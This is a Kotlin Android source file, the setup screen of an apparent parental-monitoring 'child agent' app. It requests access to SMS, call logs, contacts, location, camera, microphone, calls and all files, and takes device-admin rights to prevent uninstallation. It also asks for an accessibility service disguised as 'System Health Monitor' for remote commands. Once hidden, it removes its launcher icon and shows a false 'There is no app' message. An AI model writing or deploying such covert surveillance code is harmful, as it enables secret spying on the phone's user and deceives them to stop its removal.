package com.example.xshield.childagent

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.content.ComponentName
import android.os.Bundle
import android.view.View
import android.view.WindowManager
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import com.example.xshield.childagent.databinding.ActivitySetupBinding
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.SetOptions
import android.os.Environment
import android.provider.Settings
import android.net.Uri
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts

class SetupActivity : AppCompatActivity() {

    private lateinit var binding: ActivitySetupBinding
    private val PERM_REQUEST_CODE = 101

    private val storagePermissionLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (Environment.isExternalStorageManager()) {
                checkDeviceAdminAndActivate()
            } else {
                binding.progressBar.visibility = View.GONE
                binding.statusText.text = "All Files Access is required for File Explorer. Please allow it and tap Activate again."
                binding.activateButton.isEnabled = true
            }
        }
    }

    private val deviceAdminLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        val dpm = getSystemService(android.app.admin.DevicePolicyManager::class.java)
        val adminName = ComponentName(this, AdminReceiver::class.java)
        if (dpm.isAdminActive(adminName)) {
            checkDeviceAdminAndActivate()
        } else {
            binding.progressBar.visibility = View.GONE
            binding.statusText.text = "Device Admin is required to prevent uninstallation and enable screen lock. Please allow it."
            binding.activateButton.isEnabled = true
        }
    }

    private val accessibilitySettingsLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        checkNotificationAccess()
    }

    private val notificationAccessLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) {
        if (!isNotificationAccessGranted()) {
            Toast.makeText(this, "Notification Access is required for messaging features", Toast.LENGTH_SHORT).show()
        } else {
            checkDeviceAdminAndActivate()
        }
    }

    private fun checkNotificationAccess() {
        if (!isNotificationAccessGranted()) {
            Toast.makeText(this, "Please enable Notification Access", Toast.LENGTH_LONG).show()
            notificationAccessLauncher.launch(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
        } else {
            checkDeviceAdminAndActivate()
        }
    }

    private fun isNotificationAccessGranted(): Boolean {
        val cn = ComponentName(this, NotificationMonitorService::class.java)
        val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        return flat != null && flat.contains(cn.flattenToString())
    }

    private fun checkDeviceAdminAndActivate() {
        val dpm = getSystemService(android.app.admin.DevicePolicyManager::class.java)
        val adminName = ComponentName(this, AdminReceiver::class.java)
        if (!dpm.isAdminActive(adminName)) {
            binding.statusText.text = "Requesting Device Admin rights..."
            val intent = Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminName)
                putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required to enable remote locking and prevent unauthorized uninstallation.")
            }
            deviceAdminLauncher.launch(intent)
        } else {
            val enabledServices = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
            if (enabledServices?.contains("RemoteControlAccessibilityService") == true) {
                binding.statusText.text = "All permissions granted. Setting up…"
                activateProtection()
            } else {
                binding.progressBar.visibility = View.GONE
                binding.activateButton.isEnabled = true
                binding.statusText.text = "Accessibility Service is required for remote commands. Please enable System Health Monitor in Accessibility Settings."
                val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                accessibilitySettingsLauncher.launch(intent)
            }
        }
    }

    // Every permission we need, selected per API level
    private val allPermissions: Array<String> by lazy {
        buildList {
            // Call logs
            add(Manifest.permission.READ_CALL_LOG)
            // SMS
            add(Manifest.permission.READ_SMS)
            add(Manifest.permission.RECEIVE_SMS)
            // Contacts
            add(Manifest.permission.READ_CONTACTS)
            // Location
            add(Manifest.permission.ACCESS_FINE_LOCATION)
            add(Manifest.permission.ACCESS_COARSE_LOCATION)
            // Camera
            add(Manifest.permission.CAMERA)
            // Audio & Calls
            add(Manifest.permission.RECORD_AUDIO)
            add(Manifest.permission.READ_PHONE_STATE)
            add(Manifest.permission.ANSWER_PHONE_CALLS)
            // Media — different permissions per API level
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                add(Manifest.permission.READ_MEDIA_IMAGES)
                add(Manifest.permission.READ_MEDIA_VIDEO)
                add(Manifest.permission.READ_MEDIA_AUDIO)
                add(Manifest.permission.POST_NOTIFICATIONS)
            } else {
                add(Manifest.permission.READ_EXTERNAL_STORAGE)
            }
        }.toTypedArray()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val prefs = getSafeSharedPreferences()
        val isAlreadyActive = prefs.getBoolean("activated", false)
        val statePrefs = getSharedPreferences("agent_state_prefs", MODE_PRIVATE)
        val isHidden = statePrefs.getBoolean("agent_hidden", false)

        if (isAlreadyActive && isHidden) {
            val homeIntent = Intent(Intent.ACTION_MAIN).apply {
                addCategory(Intent.CATEGORY_HOME)
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
            startActivity(homeIntent)
            Toast.makeText(
                applicationContext,
                "There is no app. Please remove from home screen.",
                Toast.LENGTH_LONG
            ).show()
            finish()
            return
        }

        // Keep screen on during setup
        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)

        binding = ActivitySetupBinding.inflate(layoutInflater)
        setContentView(binding.root)

        if (isAlreadyActive) {
            // Already set up — show active state immediately
            showActiveState()
            // Make sure service is running
            startMonitoringService()
        }

        binding.activateButton.setOnClickListener {
            binding.statusText.text = "Requesting permissions...\nCamera sharing can only operate while permission remains granted."
            binding.progressBar.visibility = View.VISIBLE
            // Request all permissions at once — single tap, single system dialog sequence
            ActivityCompat.requestPermissions(this, allPermissions, PERM_REQUEST_CODE)
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode != PERM_REQUEST_CODE) return

        val denied = permissions
            .filterIndexed { i, _ -> grantResults[i] != PackageManager.PERMISSION_GRANTED }

        if (denied.isEmpty()) {
            // Standard permissions granted, now check All Files Access for API 30+
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                if (!Environment.isExternalStorageManager()) {
                    binding.statusText.text = "Requesting All Files Access..."
                    val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                    val uri = Uri.fromParts("package", packageName, null)
                    intent.data = uri
                    storagePermissionLauncher.launch(intent)
                    return
                }
            }
            
            // All permissions granted — check notification access then admin!
            checkNotificationAccess()
        } else {
            // Some denied — show which ones and try again
            binding.progressBar.visibility = View.GONE
            binding.statusText.text =
                "Some permissions were not allowed (${denied.size}). Please allow all for full protection. Tap the button again."
            // Re-request only the denied ones
            ActivityCompat.requestPermissions(this, denied.toTypedArray(), PERM_REQUEST_CODE)
        }
    }

    private fun activateProtection() {
        binding.activateButton.isEnabled = false
        binding.progressBar.visibility = View.VISIBLE
        binding.statusText.text = "Connecting to Family Shield network…"

        val prefs = getSafeSharedPreferences()

        // Generate or retrieve persistent device ID
        val deviceId = prefs.getString("device_id", null) ?: run {
            val hardwareId = android.provider.Settings.Secure.getString(
                contentResolver,
                android.provider.Settings.Secure.ANDROID_ID
            )
            val id = if (!hardwareId.isNullOrBlank() && hardwareId != "9774d56d682e549c") {
                hardwareId
            } else {
                java.util.UUID.randomUUID().toString().replace("-", "")
            }
            prefs.edit().putString("device_id", id).apply()
            id
        }

        var currentSetupStep = "Authenticating with Firebase..."

        // Add a timeout to prevent infinite hanging if Firestore is unreachable or not created
        val timeoutHandler = Handler(Looper.getMainLooper())
        val timeoutRunnable = Runnable {
            if (binding.progressBar.visibility == View.VISIBLE) {
                binding.progressBar.visibility = View.GONE
                binding.activateButton.isEnabled = true
                binding.statusText.text =
                    "Connection timed out at step:\n'$currentSetupStep'\n\nPlease check your internet connection. If you just set up Firebase, ensure you clicked 'Create Database' for Firestore in the Firebase Console and enabled Anonymous Authentication."
            }
        }
        timeoutHandler.postDelayed(timeoutRunnable, 15000)

        // Sign in anonymously to Firebase
        FirebaseAuth.getInstance().signInAnonymously()
            .addOnSuccessListener {
                currentSetupStep = "Connecting to Firestore Database..."
                val db = FirebaseFirestore.getInstance()

                // Register device document itself first to resolve collection query omission bug
                db.collection("devices").document(deviceId)
                    .set(mapOf(
                        "deviceId" to deviceId,
                        "deviceName" to "${Build.MANUFACTURER} ${Build.MODEL}",
                        "androidVersion" to "Android ${Build.VERSION.RELEASE}",
                        "lastSync" to System.currentTimeMillis()
                    ), SetOptions.merge())

                // Register device info
                db.collection("devices").document(deviceId)
                    .collection("info").document("status")
                    .set(mapOf(
                        "deviceId" to deviceId,
                        "deviceName" to "${Build.MANUFACTURER} ${Build.MODEL}",
                        "androidVersion" to "Android ${Build.VERSION.RELEASE}",
                        "firstLinked" to System.currentTimeMillis(),
                        "lastSync" to System.currentTimeMillis()
                    ), SetOptions.merge())
                
                // Firestore will handle syncing this data in the background.
                // We do not need to block the UI waiting for a server acknowledgement.
                // Complete activation immediately:
                timeoutHandler.removeCallbacks(timeoutRunnable)
                
                // Save as activated
                prefs.edit().putBoolean("activated", true).apply()

                // Start monitoring service
                startMonitoringService()

                // Show success UI
                showActiveState()
            }
            .addOnFailureListener { e ->
                timeoutHandler.removeCallbacks(timeoutRunnable)
                binding.progressBar.visibility = View.GONE
                binding.activateButton.isEnabled = true
                binding.statusText.text =
                    "Cannot connect to server: ${e.message}\nCheck internet and try again."
            }
    }

    private fun startMonitoringService() {
        val intent = Intent(this, MonitoringService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }

    private fun showActiveState() {
        // Update button to green "active" state
        binding.activateButton.text = "✓  PROTECTION IS ACTIVE"
        binding.activateButton.isEnabled = false
        binding.activateButton.backgroundTintList =
            android.content.res.ColorStateList.valueOf(
                android.graphics.Color.parseColor("#2E7D32")
            )

        // Hide progress, update status
        binding.progressBar.visibility = View.GONE
        binding.statusText.text = "Family Shield is running silently in the background."

        // Hide pairing section as automatic discovery is now used
        binding.divider.visibility = View.GONE
        binding.pairingSection.visibility = View.GONE

        // Show active badge
        binding.activeBadge.visibility = View.VISIBLE
    }

    private fun hideAppLauncherIcon() {
        try {
            val p = packageManager
            val componentName = ComponentName(
                this,
                "com.example.xshield.childagent.LauncherActivity"
            )
            p.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    override fun onResume() {
        super.onResume()
        val prefs = getSafeSharedPreferences()
        val isAlreadyActive = prefs.getBoolean("activated", false)
        val statePrefs = getSharedPreferences("agent_state_prefs", MODE_PRIVATE)
        val isHidden = statePrefs.getBoolean("agent_hidden", false)

        if (isAlreadyActive && isHidden) {
            val homeIntent = Intent(Intent.ACTION_MAIN).apply {
                addCategory(Intent.CATEGORY_HOME)
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
            startActivity(homeIntent)
            Toast.makeText(
                applicationContext,
                "There is no app. Please remove from home screen.",
                Toast.LENGTH_LONG
            ).show()
            finish()
        }
    }

    private fun getSafeSharedPreferences(): android.content.SharedPreferences {
        val safeContext = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            createDeviceProtectedStorageContext()
        } else {
            this
        }
        return safeContext.getSharedPreferences("xshield_prefs", MODE_PRIVATE)
    }
}
